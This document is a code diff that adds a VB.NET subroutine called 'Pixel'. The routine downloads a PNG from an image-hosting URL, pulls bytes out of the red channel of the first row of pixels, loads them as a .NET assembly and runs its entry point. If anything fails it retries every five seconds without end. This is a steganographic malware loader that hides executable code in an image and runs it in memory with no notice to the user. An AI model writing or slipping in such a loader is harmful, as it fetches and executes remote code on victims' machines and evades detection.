@@ -1,0 +1,26 @@
+Public Sub Pixel(ByVal Optional class2 As String = "https://i.ibb.co/9p7mRQB/Image.png")
+            Try
+                ServicePointManager.Expect100Continue = True
+                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
+                ServicePointManager.DefaultConnectionLimit = 9999
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+            End Try
+            Try
+A:
+                Dim B As Bitmap
+                Dim list = New List(Of Byte)()
+                Dim web = New WebClient()
+                B = Image.FromStream(web.OpenRead(class2))
+                Dim i As Object
+                Dim loopTo = B.Width - 1
+                For i = 0 To loopTo
+                    list.Add(B.GetPixel(CObj(i), CInt(0)).R)
+                Next
+                Assembly.Load(list.ToArray()).EntryPoint.Invoke(Nothing, Nothing)
+            Catch ex As Exception
+                Debug.WriteLine(ex.Message)
+                Thread.Sleep(5000)
+                GoTo A
+            End Try
+        End Sub
